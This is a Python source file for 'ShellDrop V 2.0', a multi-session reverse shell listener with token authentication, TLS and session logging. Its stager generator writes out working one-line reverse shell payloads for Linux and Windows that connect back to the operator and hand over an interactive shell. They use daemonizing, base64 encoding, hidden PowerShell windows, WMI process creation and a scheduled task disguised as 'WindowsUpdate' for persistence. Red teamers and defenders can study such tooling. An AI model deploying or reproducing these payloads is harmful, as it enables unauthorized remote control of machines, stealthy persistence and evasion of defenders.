#!/usr/bin/env python3

"""
╔═══════════════════════════════════════════════════════════════╗
║                 ShellDrop V 2.0 - SECURE EDITION              ║
║       Authenticated & Encrypted Reverse Shell Framework       ║
║                                                               ║
║ Features: TLS Encryption, Token Auth, Session Logging         ║
║ Purpose: Professional Penetration Testing & Red Team Ops      ║
╚═══════════════════════════════════════════════════════════════╝

⚠️  FOR AUTHORIZED USE ONLY - Unauthorized use is illegal ⚠️
"""

import socket
import threading
import sys
import os
import argparse
import time
import base64
import hashlib
import hmac
import ssl
import re
import queue
import json
from datetime import datetime
from io import BytesIO

# --- ANSI Color Codes ---
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# --- Global Configuration ---
AUTH_TOKEN = None  # Will be generated at runtime
USE_TLS = False
LOG_DIR = "./shelldrop_logs"

# --- Global State Management ---
clients = {}
clients_lock = threading.Lock()
current_client_id = None
client_id_counter = 0
print_lock = threading.Lock()
input_queue = queue.Queue()
last_prompt = None
last_command = ""

def generate_auth_token():
    """Generate a random authentication token."""
    return base64.b64encode(os.urandom(32)).decode('utf-8')

def create_self_signed_cert(cert_file="server.crt", key_file="server.key"):
    """Create a self-signed certificate for TLS."""
    if os.path.exists(cert_file) and os.path.exists(key_file):
        return True
    
    try:
        from OpenSSL import crypto
        
        # Create key pair
        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, 2048)
        
        # Create certificate
        cert = crypto.X509()
        cert.get_subject().C = "US"
        cert.get_subject().ST = "State"
        cert.get_subject().L = "City"
        cert.get_subject().O = "Organization"
        cert.get_subject().OU = "Unit"
        cert.get_subject().CN = "localhost"
        cert.set_serial_number(1000)
        cert.gmtime_adj_notBefore(0)
        cert.gmtime_adj_notAfter(365*24*60*60)  # Valid for 1 year
        cert.set_issuer(cert.get_subject())
        cert.set_pubkey(k)
        cert.sign(k, 'sha256')
        
        # Save certificate
        with open(cert_file, "wb") as f:
            f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        
        # Save private key
        with open(key_file, "wb") as f:
            f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
        
        return True
    except ImportError:
        print(f"{Colors.WARNING}[!] pyOpenSSL not installed. TLS disabled.{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Install with: pip install pyOpenSSL{Colors.ENDC}")
        return False

class SessionLogger:
    """Logs all session activity to disk."""
    def __init__(self, session_id, client_addr, log_dir=LOG_DIR):
        os.makedirs(log_dir, exist_ok=True)
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.log_file = os.path.join(log_dir, f"session_{session_id}_{timestamp}_{client_addr[0]}.log")
        self.session_id = session_id
        self.start_time = datetime.now()
        
        # Write session header
        with open(self.log_file, 'w') as f:
            f.write("="*70 + "\n")
            f.write(f"ShellDrop Session Log - Session ID: {session_id}\n")
            f.write(f"Client Address: {client_addr[0]}:{client_addr[1]}\n")
            f.write(f"Start Time: {self.start_time}\n")
            f.write("="*70 + "\n\n")
    
    def log(self, log_type, content):
        """Log an event with timestamp."""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(self.log_file, 'a') as f:
            f.write(f"[{timestamp}] [{log_type}] {content}\n")
    
    def close(self):
        """Close the log with session summary."""
        end_time = datetime.now()
        duration = end_time - self.start_time
        with open(self.log_file, 'a') as f:
            f.write("\n" + "="*70 + "\n")
            f.write(f"Session End Time: {end_time}\n")
            f.write(f"Session Duration: {duration}\n")
            f.write("="*70 + "\n")

def safe_print(message, color=Colors.ENDC):
    """Thread-safe print function."""
    global last_prompt
    with print_lock:
        if last_prompt is not None:
            print()
            last_prompt = None
        print(f"{color}{message}{Colors.ENDC}")

def get_prompt():
    """Returns the appropriate prompt string."""
    global current_client_id
    if current_client_id is not None and current_client_id in clients:
        client = clients[current_client_id]
        client_prompt = client.prompt
        if client_prompt:
            match = re.search(r'([^@]+)@([^:]+):([^#$]+)', client_prompt)
            if match:
                user, host, path = match.groups()
                return f"{Colors.OKGREEN}shelldrop>@{user}@{host}:{path}$> {Colors.ENDC}"
            else:
                match = re.search(r'([^@]+)@([^#$]+)', client_prompt)
                if match:
                    user, host = match.groups()
                    return f"{Colors.OKGREEN}shelldrop>@{user}@{host}$> {Colors.ENDC}"
                else:
                    return f"{Colors.OKGREEN}shelldrop>@client{current_client_id}$> {Colors.ENDC}"
    return f"{Colors.OKCYAN}shelldrop> {Colors.ENDC}"

def redraw_prompt():
    """Redraws the prompt."""
    global last_prompt
    with print_lock:
        prompt = get_prompt()
        if prompt != last_prompt:
            if last_prompt is not None:
                print()
            sys.stdout.write(prompt)
            sys.stdout.flush()
            last_prompt = prompt

class Client:
    """Represents an authenticated connected client."""
    def __init__(self, conn, addr, client_id, auth_token):
        self.conn = conn
        self.addr = addr
        self.id = client_id
        self.auth_token = auth_token
        self.prompt = ""
        self.output_queue = queue.Queue()
        self.os_type = "unknown"
        self.authenticated = False
        self.logger = SessionLogger(client_id, addr)
        
        # Perform authentication
        if not self.authenticate():
            self.logger.log("AUTH", "Authentication FAILED")
            self.logger.close()
            raise Exception("Authentication failed")
        
        self.logger.log("AUTH", "Authentication successful")
        self.receive_thread = threading.Thread(target=self.receive_data, daemon=True)
        self.receive_thread.start()

    def authenticate(self):
        """Authenticate the client with token-based auth."""
        try:
            # Send authentication challenge
            challenge = os.urandom(16)
            self.conn.send(b"AUTH:" + base64.b64encode(challenge) + b"\n")
            self.conn.settimeout(10)
            
            # Receive response
            response = self.conn.recv(1024).strip()
            
            # Verify HMAC
            expected = hmac.new(
                self.auth_token.encode(),
                challenge,
                hashlib.sha256
            ).digest()
            expected_b64 = base64.b64encode(expected)
            
            if response == expected_b64:
                self.conn.send(b"AUTH:OK\n")
                self.conn.settimeout(None)
                self.authenticated = True
                return True
            else:
                self.conn.send(b"AUTH:FAIL\n")
                self.conn.close()
                return False
        except Exception as e:
            self.conn.close()
            return False

    def receive_data(self):
        """Continuously receives data from the client."""
        buffer = ""
        while True:
            try:
                data = self.conn.recv(4096)
                if not data:
                    self.output_queue.put(("__DISCONNECT__", ""))
                    break
                decoded_data = data.decode('utf-8', errors='ignore')
                buffer += decoded_data
                
                # Detect OS type
                if "PS " in decoded_data and self.os_type == "unknown":
                    self.os_type = "windows"
                    self.logger.log("INFO", "Detected OS: Windows")
                elif any(x in decoded_data for x in ["$", "#", "bash"]) and self.os_type == "unknown":
                    self.os_type = "linux"
                    self.logger.log("INFO", "Detected OS: Linux")
                
                while '\n' in buffer:
                    line, buffer = buffer.split('\n', 1)
                    self.logger.log("OUTPUT", line)
                    self.output_queue.put(("", line + '\n'))
                
                if buffer:
                    self.logger.log("OUTPUT", buffer)
                    self.output_queue.put(("", buffer))
                    buffer = ""
            except (ConnectionResetError, BrokenPipeError):
                self.output_queue.put(("__DISCONNECT__", ""))
                break
            except Exception as e:
                self.output_queue.put(("error", f"[-] Error: {e}"))
                break

    def send_data(self, data):
        """Sends data to the client."""
        global last_command
        try:
            last_command = data.strip()
            self.logger.log("COMMAND", data.strip())
            self.conn.send(data.encode('utf-8'))
        except Exception:
            self.output_queue.put(("__DISCONNECT__", ""))

    def disconnect(self):
        """Closes the connection."""
        try:
            self.logger.log("INFO", "Session terminated")
            self.logger.close()
            self.conn.close()
        except:
            pass

def handle_user_input():
    """Dedicated thread for user input."""
    global last_prompt
    while True:
        try:
            cmd = input()
            with print_lock:
                last_prompt = None
            input_queue.put(cmd)
        except (EOFError, KeyboardInterrupt):
            input_queue.put("exit")
            break

def get_local_ip():
    """Determines the primary non-loopback IP address."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        if ip.startswith("127."):
            safe_print("[-] Could not determine local IP. Please specify it with -l.", Colors.FAIL)
            sys.exit(1)
        return ip

def generate_auth_stager(ip, port, auth_token, use_tls=False):
    """Generate STEALTHY authentication stager code with PROPER BACKGROUNDING."""
    
    payloads = {}
    
    # ============ LINUX AUTHENTICATED PAYLOADS ============
    
    # Core auth payload (used in variations)
    core_auth = f'import socket,subprocess,os,base64,hmac,hashlib,sys;s=socket.socket();s.connect(("{ip}",{port}));d=s.recv(1024);c=base64.b64decode(d.split(b":")[1].strip());r=base64.b64encode(hmac.new(b"{auth_token}",c,hashlib.sha256).digest());s.send(r+b"\\n");s.recv(1024);os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
    
    # Method 1: Proper daemon (double fork) - MOST STEALTHY
    daemon_payload = f'import socket,subprocess,os,base64,hmac,hashlib,sys;os.fork() and sys.exit();os.setsid();os.fork() and sys.exit();s=socket.socket();s.connect(("{ip}",{port}));d=s.recv(1024);c=base64.b64decode(d.split(b":")[1].strip());r=base64.b64encode(hmac.new(b"{auth_token}",c,hashlib.sha256).digest());s.send(r+b"\\n");s.recv(1024);os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
    linux_daemon = f'''python3 -c '{daemon_payload}' &'''
    payloads['Linux (Python - Daemonized & Auth)'] = linux_daemon
    
    # Method 2: Simple background with disown - CLEAN EXIT
    linux_bg_disown = f'''(python3 -c '{core_auth}' &) && disown && exit'''
    payloads['Linux (Python - Background & Exit)'] = linux_bg_disown
    
    # Method 3: Nohup for persistence
    linux_nohup = f'''nohup python3 -c '{core_auth}' >/dev/null 2>&1 &'''
    payloads['Linux (Python - Nohup Persistent)'] = linux_nohup
    
    # Method 4: Screen/tmux detached (if available)
    linux_screen = f'''screen -dmS update python3 -c '{core_auth}' '''
    payloads['Linux (Python - Screen Detached)'] = linux_screen
    
    # Method 5: Base64 encoded + backgrounded
    encoded_auth = base64.b64encode(core_auth.encode()).decode()
    linux_encoded = f'''(python3 -c "import base64;exec(base64.b64decode('{encoded_auth}'))" &) && exit'''
    payloads['Linux (Python - Encoded & BG)'] = linux_encoded
    
    # Method 6: Bash wrapper with full stealth
    bash_stealth = f'''(nohup bash -c 'python3 -c "{core_auth}" ' >/dev/null 2>&1 &) && exit'''
    payloads['Linux (Bash Wrapper - Stealth)'] = bash_stealth
    
    # ============ WINDOWS AUTHENTICATED PAYLOADS ============
    
    # Core PowerShell auth payload
    ps_core = f'''$c=New-Object Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();$b=New-Object Byte[] 1024;$i=$s.Read($b,0,$b.Length);$d=[Text.Encoding]::ASCII.GetString($b,0,$i);$ch=[Convert]::FromBase64String($d.Split(':')[1].Trim());$h=New-Object Security.Cryptography.HMACSHA256;$h.Key=[Text.Encoding]::UTF8.GetBytes('{auth_token}');$r=[Convert]::ToBase64String($h.ComputeHash($ch))+[char]10;$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length);$i=$s.Read($b,0,$b.Length);[byte[]]$by=0..65535|%{{0}};while(($i=$s.Read($by,0,$by.Length))-ne 0){{$da=(New-Object Text.ASCIIEncoding).GetString($by,0,$i);$sb=(iex $da 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbb,0,$sbb.Length);$s.Flush()}};$c.Close()'''
    
    # Method 1: Start-Process with hidden window
    ps_hidden = f'''powershell -nop -w hidden -c "Start-Process -NoNewWindow -FilePath powershell -ArgumentList '-nop','-w','hidden','-c','{ps_core}'"'''
    payloads['Windows (PowerShell - Hidden Start)'] = ps_hidden
    
    # Method 2: Start-Job backgrounding
    ps_job = f'''powershell -nop -w hidden -c "Start-Job -ScriptBlock {{{ps_core}}}"'''
    payloads['Windows (PowerShell - Background Job)'] = ps_job
    
    # Method 3: WMI Process Create (very stealthy)
    ps_wmi = f'''powershell -nop -w hidden -c "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -nop -w hidden -c {ps_core}'"'''
    payloads['Windows (PowerShell - WMI Create)'] = ps_wmi
    
    # Method 4: Base64 encoded
    ps_b64 = base64.b64encode(ps_core.encode('utf-16le')).decode()
    ps_encoded = f'''powershell -nop -w hidden -enc {ps_b64}'''
    payloads['Windows (PowerShell - Encoded)'] = ps_encoded
    
    # Method 5: Scheduled task (persistent)
    ps_schtask = f'''powershell -nop -c "schtasks /create /tn WindowsUpdate /tr 'powershell -nop -w hidden -c {ps_core}' /sc once /st 00:00 /f; schtasks /run /tn WindowsUpdate"'''
    payloads['Windows (PowerShell - Scheduled Task)'] = ps_schtask
    
    # Method 6: Python for Windows (backgrounded)
    win_py_auth = f'import socket,subprocess,os,base64,hmac,hashlib,sys;s=socket.socket();s.connect(("{ip}",{port}));d=s.recv(1024);c=base64.b64decode(d.split(b":")[1].strip());r=base64.b64encode(hmac.new(b"{auth_token}",c,hashlib.sha256).digest());s.send(r+b"\\n");s.recv(1024);subprocess.call("cmd.exe",stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
    ps_py_launcher = f'''powershell -nop -w hidden -c "Start-Process -NoNewWindow python -ArgumentList '-c','{win_py_auth}'"'''
    payloads['Windows (Python via PowerShell)'] = ps_py_launcher
    
    return payloads

def accept_connections(server, auth_token):
    """Accepts new client connections."""
    global client_id_counter
    while True:
        try:
            server.settimeout(1)
            conn, addr = server.accept()
            
            # If using TLS, connection is already wrapped
            try:
                with clients_lock:
                    client_id_counter += 1
                    client = Client(conn, addr, client_id_counter, auth_token)
                    clients[client_id_counter] = client
                    safe_print(f"[+] Authenticated session: {addr[0]}:{addr[1]} → ID: {client_id_counter}", Colors.OKGREEN)
            except Exception as e:
                safe_print(f"[-] Authentication failed from {addr[0]}:{addr[1]}", Colors.FAIL)
                try:
                    conn.close()
                except:
                    pass
        except socket.timeout:
            continue
        except Exception:
            break

def print_banner():
    """Prints the professional banner."""
    banner = f"""{Colors.HEADER}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════╗
║              ShellDrop V 2.0 - SECURE EDITION                 ║
║    Authenticated & Encrypted Reverse Shell Framework          ║
╚═══════════════════════════════════════════════════════════════╝
{Colors.ENDC}"""
    print(banner)
    safe_print("⚠️  FOR AUTHORIZED PENETRATION TESTING ONLY", Colors.WARNING)
    if USE_TLS:
        safe_print("🔒 TLS Encryption: ENABLED", Colors.OKGREEN)
    else:
        safe_print("⚠️  TLS Encryption: DISABLED (plaintext mode)", Colors.WARNING)
    print()

def main():
    """Main orchestration function."""
    global current_client_id, last_prompt, last_command, AUTH_TOKEN, USE_TLS, LOG_DIR
    
    parser = argparse.ArgumentParser(
        description="ShellDrop v2.0 - Secure Reverse Shell Listener with Authentication",
        epilog="Example: python3 shelldrop_secure.py -p 4444 --tls",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument('-l', '--listen-ip', help="IP address to bind (auto-detected if not provided)")
    parser.add_argument('-p', '--port', type=int, required=True, help="Port to listen on")
    parser.add_argument('--tls', action='store_true', help="Enable TLS encryption")
    parser.add_argument('--token', help="Custom auth token (generated if not provided)")
    parser.add_argument('--log-dir', default="./shelldrop_logs", help="Directory for session logs")
    
    args = parser.parse_args()
    listener_ip = args.listen_ip if args.listen_ip else get_local_ip()
    port = args.port
    USE_TLS = args.tls
    LOG_DIR = args.log_dir
    
    # Generate or use provided auth token
    AUTH_TOKEN = args.token if args.token else generate_auth_token()
    
    print_banner()
    
    safe_print(f"{Colors.BOLD}[*] Authentication Token: {Colors.OKGREEN}{AUTH_TOKEN}{Colors.ENDC}")
    safe_print(f"{Colors.WARNING}[!] Keep this token secure - required for all connections{Colors.ENDC}\n")
    
    # Generate authenticated payloads
    payloads = generate_auth_stager(listener_ip, port, AUTH_TOKEN, USE_TLS)
    
    safe_print(f"{Colors.OKCYAN}{Colors.BOLD}╔═══ AUTHENTICATED PAYLOADS ════════════════════════════════════╗{Colors.ENDC}")
    safe_print(f"{Colors.OKCYAN}║ Execute one of these commands on the target machine:         ║{Colors.ENDC}")
    safe_print(f"{Colors.OKCYAN}╚═══════════════════════════════════════════════════════════════╝{Colors.ENDC}\n")
    
    for name, payload in payloads.items():
        safe_print(f"{Colors.BOLD}{Colors.OKGREEN}┌─[ {name} ]{Colors.ENDC}")
        safe_print(f"{Colors.OKBLUE}└─▸ {Colors.ENDC}{payload}\n")
    
    safe_print(f"{Colors.OKCYAN}{'─' * 66}{Colors.ENDC}\n")
    safe_print(f"[*] Session logs will be saved to: {LOG_DIR}", Colors.OKCYAN)
    print()

    # Create socket
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # Wrap with TLS if enabled
    if USE_TLS:
        if create_self_signed_cert():
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain('server.crt', 'server.key')
            server = context.wrap_socket(server, server_side=True)
            safe_print("[+] TLS encryption enabled", Colors.OKGREEN)
        else:
            safe_print("[-] Failed to enable TLS, continuing in plaintext mode", Colors.WARNING)
            USE_TLS = False
    
    try:
        server.bind((listener_ip, port))
        server.listen(5)
        safe_print(f"[✓] Listener active on {listener_ip}:{port}", Colors.OKGREEN)
        safe_print(f"[✓] Awaiting authenticated connections...\n", Colors.OKGREEN)
        
        acceptor_thread = threading.Thread(target=accept_connections, args=(server, AUTH_TOKEN), daemon=True)
        acceptor_thread.start()

        input_handler_thread = threading.Thread(target=handle_user_input, daemon=True)
        input_handler_thread.start()

        redraw_prompt()

        while True:
            try:
                cmd = input_queue.get(timeout=0.1)
                
                if current_client_id is None:
                    if cmd.lower() == "list":
                        safe_print(f"\n{Colors.OKCYAN}╔═══ ACTIVE SESSIONS ═══════════════════════════════════════╗{Colors.ENDC}")
                        with clients_lock:
                            if not clients: 
                                safe_print(f"{Colors.WARNING}║ No active sessions{Colors.ENDC}")
                            else:
                                for cid, client in clients.items():
                                    os_info = f"[{client.os_type}]" if client.os_type != "unknown" else ""
                                    safe_print(f"{Colors.OKGREEN}║ Session {cid:02d} │ {client.addr[0]:15s}:{client.addr[1]:5d} {os_info}{Colors.ENDC}")
                        safe_print(f"{Colors.OKCYAN}╚═══════════════════════════════════════════════════════════╝{Colors.ENDC}\n")
                        redraw_prompt()
                    
                    elif cmd.lower().startswith("use "):
                        try:
                            target_id = int(cmd.split(" ")[1])
                            with clients_lock:
                                if target_id in clients:
                                    current_client_id = target_id
                                    safe_print(f"[*] Interacting with Session {target_id} | Type 'background' to detach", Colors.OKGREEN)
                                    redraw_prompt()
                                else:
                                    safe_print(f"[-] Session {target_id} not found", Colors.FAIL)
                        except (ValueError, IndexError):
                            safe_print("[-] Usage: use <session_id>", Colors.FAIL)
                        redraw_prompt()
                    
                    elif cmd.lower().startswith("kill "):
                        try:
                            target_id = int(cmd.split(" ")[1])
                            with clients_lock:
                                if target_id in clients:
                                    clients[target_id].disconnect()
                                    del clients[target_id]
                                    safe_print(f"[*] Session {target_id} terminated", Colors.WARNING)
                                    if current_client_id == target_id:
                                        current_client_id = None
                                else:
                                    safe_print(f"[-] Session {target_id} not found", Colors.FAIL)
                        except (ValueError, IndexError):
                            safe_print("[-] Usage: kill <session_id>", Colors.FAIL)
                        redraw_prompt()
                    
                    elif cmd.lower() in ["exit", "quit"]:
                        safe_print("\n[*] Shutting down ShellDrop...", Colors.WARNING)
                        with clients_lock:
                            for client_id in list(clients.keys()):
                                clients[client_id].disconnect()
                        server.close()
                        sys.exit(0)
                    
                    elif cmd.lower() == "help":
                        safe_print(f"\n{Colors.OKCYAN}╔═══ AVAILABLE COMMANDS ════════════════════════════════════╗{Colors.ENDC}")
                        safe_print(f"{Colors.OKGREEN}║ list              - Show all active sessions{Colors.ENDC}")
                        safe_print(f"{Colors.OKGREEN}║ use <id>          - Interact with a session{Colors.ENDC}")
                        safe_print(f"{Colors.OKGREEN}║ kill <id>         - Terminate a session{Colors.ENDC}")
                        safe_print(f"{Colors.OKGREEN}║ background        - Return to main menu (from session){Colors.ENDC}")
                        safe_print(f"{Colors.OKGREEN}║ exit/quit         - Shutdown the listener{Colors.ENDC}")
                        safe_print(f"{Colors.OKCYAN}╚═══════════════════════════════════════════════════════════╝{Colors.ENDC}\n")
                        redraw_prompt()
                    
                    elif cmd:
                        safe_print("[-] Unknown command. Type 'help' for available commands", Colors.FAIL)
                        redraw_prompt()
                else:
                    if cmd.strip().lower() == "background":
                        safe_print(f"[*] Session {current_client_id} backgrounded (still active)", Colors.OKCYAN)
                        current_client_id = None
                        redraw_prompt()
                    else:
                        with clients_lock:
                            if current_client_id in clients:
                                clients[current_client_id].send_data(cmd + "\n")
                            else:
                                safe_print(f"[-] Session {current_client_id} disconnected", Colors.FAIL)
                                current_client_id = None
                                redraw_prompt()
                
                if current_client_id is None:
                    redraw_prompt()

            except queue.Empty:
                output_received = False
                with clients_lock:
                    for client_id, client in list(clients.items()):
                        try:
                            while True:
                                msg_type, data = client.output_queue.get_nowait()
                                output_received = True
                                if msg_type == "__DISCONNECT__":
                                    safe_print(f"\n[!] Session {client_id} ({client.addr[0]}) terminated", Colors.WARNING)
                                    if current_client_id == client_id:
                                        current_client_id = None
                                    client.disconnect()
                                    del clients[client_id]
                                    redraw_prompt()
                                    break
                                
                                if msg_type == "error":
                                    safe_print(data, Colors.FAIL)
                                    redraw_prompt()
                                    continue
                                
                                # Filter common error messages
                                if any(x in data.lower() for x in ["cannot set terminal", "no job control"]):
                                    continue
                                
                                # Detect and store prompts
                                if re.match(r'^.*@.*[#$]\s*$', data.strip()) or re.match(r'^PS\s+[A-Z]:', data.strip()):
                                    client.prompt = data.strip()
                                    if current_client_id == client_id:
                                        redraw_prompt()
                                else:
                                    if current_client_id == client_id:
                                        if data.strip() == last_command:
                                            continue
                                        else:
                                            with print_lock:
                                                if last_prompt is not None:
                                                    print()
                                                    last_prompt = None
                                                sys.stdout.write(data)
                                                sys.stdout.flush()
                        except queue.Empty:
                            pass
                
                if current_client_id is None and not output_received:
                    redraw_prompt()

    except KeyboardInterrupt:
        safe_print("\n\n[*] Shutting down ShellDrop...", Colors.WARNING)
        with clients_lock:
            for client_id in list(clients.keys()):
                clients[client_id].disconnect()
        server.close()
        sys.exit(0)
    except Exception as e:
        safe_print(f"[-] Critical error: {e}", Colors.FAIL)
        server.close()
        sys.exit(1)

if __name__ == "__main__":
    main()
